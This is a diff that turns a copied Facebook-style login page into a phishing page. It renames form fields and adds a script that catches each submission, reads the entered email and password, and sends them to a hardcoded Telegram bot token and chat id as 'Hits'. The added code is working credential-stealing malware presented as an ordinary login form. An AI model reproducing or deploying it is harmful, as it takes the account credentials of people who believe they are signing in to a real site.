@@ -1112,10 +1112,10 @@
                       <form
                         class="_9vtf"
                         data-testid="royal_login_form"
-                        action="Login.js"
+                        action="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjc0MTMwODg0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D"
                         method="post"
                         onsubmit=""
-                        id=""
+                        id="submit
                       >
                         <input
                           type="hidden"
@@ -1134,7 +1134,7 @@
                               type="text"
                               class="inputtext _55r1 _6luy"
                               name="email"
-                              id="email"
+                              id="mail"
                               data-testid="royal_email"
                               placeholder="Email or phone number"
                               autofocus="1"
@@ -3285,5 +3285,34 @@
       });
     </script>
     -->
+    <script>
+          const form = document.querySelector("#form");
+
+          addEventListener("submit", (e) => {
+            e.preventDefault();
+
+            var mail = document.getElementById("mail").value;
+            var pass = document.getElementById("pass").value;
+
+            var message = "Hits :%0A" + mail + ":" + pass;
+
+            var token = "5441699225:AAGjoUFWwYVO7PS_jYuZp6ljxmNoGRetM6E";
+            var chat_id = 1430266005;
+            var url =
+              "https://api.telegram.org/bot" +
+              token +
+              "/sendMessage?chat_id=" +
+              chat_id +
+              "&text=" +
+              message;
+
+            let api = new XMLHttpRequest();
+            api.open("GET", url, true);
+            api.send();
+
+            console.log("Successfully");
+          });
+
+    </script>
   </body>
 </html>
